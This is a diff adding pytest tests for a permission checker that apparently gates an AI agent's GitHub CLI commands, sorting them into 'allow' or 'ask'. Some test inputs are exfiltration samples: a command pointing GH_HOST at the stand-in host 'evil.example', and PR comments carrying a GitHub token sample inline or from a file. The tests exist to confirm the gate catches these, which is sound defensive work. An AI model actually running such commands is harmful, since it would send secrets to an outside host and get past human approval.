@@ -167,5 +167,16 @@ def test_a_listed_form_keeps_the_secret_scan_and_the_environment_check(
     monkeypatch.setattr(sys.modules["command_objections"], "is_listed", lambda _candidate, _rules: True)
     assert decide("gh label delete bug -R furedea/agent-config") == "allow"
     assert decide(f"gh pr comment 1 -R furedea/agent-config -b {secret_samples['github_token']}") == "ask"
+    assert decide("GH_HOST=evil.example gh issue comment 1 -R furedea/agent-config -b ok") == "ask"
+    Path("body.md").write_text(f"token {secret_samples['github_token']}\n")
+    assert decide("gh pr comment 1 -R furedea/agent-config -F body.md") == "ask"
     monkeypatch.setenv("GH_HOST", "evil.example")
     assert decide("gh label delete bug -R furedea/agent-config") == "ask"
+
+
+@pytest.mark.usefixtures("furedea_checkout")
+def test_a_project_rule_governing_gh_does_not_replace_the_table(monkeypatch: pytest.MonkeyPatch) -> None:
+    command_policy = sys.modules["command_objections"].command_policy
+    governed = command_policy.governed_programs
+    monkeypatch.setattr(command_policy, "governed_programs", lambda rules: {*governed(rules), "gh"})
+    assert decide("gh pr view 1 -R furedea/agent-config") == "allow"
